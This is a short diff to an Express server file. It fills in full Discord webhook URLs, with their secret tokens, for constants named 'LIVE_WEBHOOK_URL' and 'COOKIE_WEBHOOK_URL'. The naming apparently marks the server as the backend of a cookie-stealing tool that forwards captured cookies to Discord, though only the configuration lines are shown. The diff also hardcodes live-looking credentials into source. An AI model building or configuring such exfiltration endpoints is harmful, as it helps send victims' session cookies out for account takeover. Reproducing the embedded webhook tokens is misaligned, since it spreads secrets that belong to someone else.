@@ -7,8 +7,8 @@ const app = express();
 const port = 3000; // Choose your desired port
 
 // --- IMPORTANT: REPLACE THESE WITH YOUR ACTUAL DISCORD WEBHOOK URLS ---
-const LIVE_WEBHOOK_URL = "YOUR_LIVE_WEBHOOK_URL_HERE"; // Example: "https://discord.com/api/webhooks/1483775258338267136/CgDpBMv_suLH7C3ZBt2ucFfTVU2ZaK5w3Pl2DjHKRDifzqGO3cZiSTIXX3GX2inP-pnf"
-const COOKIE_WEBHOOK_URL = "YOUR_COOKIE_WEBHOOK_URL_HERE"; // Example: "https://discord.com/api/webhooks/1466101849584177467/waqpq2EhEC1iH_1YLzwBrmsbyGn4ZD6diS-J-3-vF_Jy8YQ_bc5wAjr0eA1cIhroq04k"
+const LIVE_WEBHOOK_URL = "https://discord.com/api/webhooks/1483775258338267136/CgDpBMv_suLH7C3ZBt2ucFfTVU2ZaK5w3Pl2DjHKRDifzqGO3cZiSTIXX3GX2inP-pnf"; // Example: "https://discord.com/api/webhooks/..."
+const COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1483775268828217436/tp3OTuIKOQoomeZesazDkJFQW5NtsdYMtgkxgUO3dNVzztmw_sP1Vh6SyFYujGm2gDKy"; // Example: "https://discord.com/api/webhooks/..."
 
 // Middleware
 app.use(express.json()); // To parse JSON request bodies
